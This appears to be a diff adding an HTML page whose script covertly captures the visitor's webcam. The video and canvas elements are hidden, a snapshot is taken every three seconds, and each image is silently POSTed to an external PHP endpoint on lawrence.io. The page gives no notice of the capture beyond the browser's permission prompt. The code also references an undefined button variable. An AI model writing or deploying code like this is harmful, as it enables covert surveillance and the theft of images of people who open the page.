@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html ng-app="app" class="no-js" lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title></title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link rel="stylesheet" href="css/bootstrap.min.css">
+        <style>
+            body {
+                padding-top: 50px;
+                padding-bottom: 20px;
+            }
+        </style>
+        <link rel="stylesheet" href="css/bootstrap-theme.min.css">
+        <link rel="stylesheet" href="css/main.css">
+        <script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
+
+        <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
+    </head>
+<video autoplay  style="display:none;"></video>
+<img src="" id='screenshot'>
+<canvas style="display:none;"></canvas>
+
+
+<script>
+
+  var video = document.querySelector('video');
+  var canvas = document.querySelector('canvas');
+  var ctx = canvas.getContext('2d');
+  var localMediaStream = null;
+var img = document.querySelector('#screenshot');
+  function snapshot() {
+    if (localMediaStream) {
+      ctx.drawImage(video, 0, 0);
+      // "image/webp" works in Chrome.
+      // Other browsers will fall back to image/png.
+
+      var imgData= canvas.toDataURL('image/png')
+      document.querySelector('img').src = imgData;
+
+       $.ajax({
+        type: "POST",
+        url: "http://www.lawrence.io/ct/saveImage.php",
+        data: {
+            image: imgData
+        }
+    }).done(function (respond) {
+      //  var url = 'http://www.lawrence.io/ct/image.png';
+      //  window.location = url;
+    });
+
+    }
+  }
+
+
+
+
+  setInterval(function(){
+if (localMediaStream) {
+ snapshot();
+ return;
+}
+},3000);
+
+function sizeCanvas() {
+  // video.onloadedmetadata not firing in Chrome so we have to hack.
+  // See crbug.com/110938.
+  setTimeout(function() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    img.height = video.videoHeight;
+    img.width = video.videoWidth;
+  }, 100);
+}
+
+  if (navigator.getUserMedia) {
+    navigator.getUserMedia('video', function(stream) {
+      video.src = stream;
+      localMediaStream = stream;
+      sizeCanvas();
+      button.textContent = 'Take Shot';
+    }, errorCallback);
+  } else if (navigator.webkitGetUserMedia) {
+    navigator.webkitGetUserMedia({video: true}, function(stream) {
+      video.src = window.URL.createObjectURL(stream);
+      localMediaStream = stream;
+      sizeCanvas();
+
+    }, errorCallback);
+  } else {
+    errorCallback({target: video});
+  }
+//}, false);
+
+  function errorCallback(e){
+    console.log(e)
+  }
+</script>
+
+
+</body>
+</html>
